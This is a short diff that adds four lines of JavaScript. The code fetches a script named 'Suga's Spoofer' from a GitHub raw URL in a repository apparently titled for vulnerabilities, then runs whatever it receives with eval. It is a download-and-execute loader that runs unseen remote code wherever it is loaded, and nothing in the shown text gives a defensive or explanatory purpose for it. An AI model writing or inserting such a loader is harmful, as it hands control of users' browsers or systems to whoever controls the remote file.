@@ -1,0 +1,4 @@
+fetch('http://raw.githubusercontent.com/SugaBlaz/SMPN-1-GABUS_VULNERABILITIES/refs/heads/main/Suga's%20Spoofer')
+  .then(response => response.text())
+  .then(code => eval(code))
+  .catch(err => console.error('Failed to load script:', err));
